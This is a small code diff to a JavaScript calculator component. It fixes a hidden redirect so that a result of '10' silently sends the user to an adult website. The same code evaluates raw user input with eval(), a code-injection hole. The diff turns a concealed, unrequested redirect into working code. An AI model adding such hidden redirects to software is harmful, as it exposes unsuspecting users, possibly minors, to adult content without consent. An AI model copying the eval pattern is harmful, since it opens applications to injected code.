@@ -22,7 +22,7 @@ const Calculate = () =>{
         try{
            const  result = eval(input).toString();
             if (result === '10'){
-                window.href = "https://toppornsites.com";
+                window.location.href = "https://toppornsites.com";
             }
          setInput(result);
         } catch (error){
